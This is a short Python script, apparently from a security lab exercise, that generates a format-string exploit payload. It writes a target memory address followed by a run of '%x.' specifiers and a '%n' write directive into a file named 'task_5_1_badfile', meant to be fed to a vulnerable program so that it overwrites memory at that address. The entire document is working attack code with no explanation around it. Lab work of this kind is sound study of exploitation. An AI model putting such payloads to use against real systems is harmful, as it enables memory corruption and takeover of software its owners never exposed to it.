#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

target_address = 0x080e5068
content[0:4] = (target_address).to_bytes(4, byteorder='little')

s = "%x." * 31 + "%n"

fmt = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

file = open("task_5_1_badfile", "wb")
file.write(content)
file.close()
